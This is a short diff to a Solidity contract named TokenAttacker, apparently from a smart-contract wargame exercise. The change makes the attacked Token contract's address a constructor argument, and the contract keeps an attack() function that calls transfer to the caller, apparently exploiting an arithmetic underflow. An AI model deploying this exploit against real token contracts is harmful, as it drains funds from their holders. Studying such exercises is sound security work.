@@ -6,7 +6,12 @@ import "./Token.sol";
 
 contract TokenAttacker {
   using SafeMath for uint256;
-  Token target = Token(0x95d7B9960500BDe2229D85b896fB6E5bD8578cA2);
+  Token target;
+
+  constructor(address _target) public {
+    target = Token(_target);
+  }
+
 
   function attack() public {
     target.transfer(msg.sender, 22);
